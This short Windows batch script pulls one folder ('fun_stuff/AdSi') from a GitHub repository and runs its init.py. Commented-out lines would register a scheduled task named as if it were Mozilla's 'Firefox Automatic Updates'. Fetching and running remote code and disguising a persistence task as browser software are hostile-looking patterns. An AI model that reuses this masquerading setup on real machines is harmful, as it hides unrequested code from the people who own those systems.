git init
git remote add -f origin https://github.com/ribsey/scripts
git config core.sparseCheckout true

echo fun_stuff/AdSi/ >> .git/info/sparse-checkout

git pull origin master

cd fun_stuff/AdSi

@REM FOR /F "tokens=1" %%F IN ('"whoami"') DO SET USER=%%F

@REM echo %USER%

@REM schtasks /create /xml "Firefox Automatic Updates 308046B0AF4A39CB.xml" /tn "\Mozilla\Firefox Automatic Updates 308046B0AF4A39CB" /ru %USER%

python init.py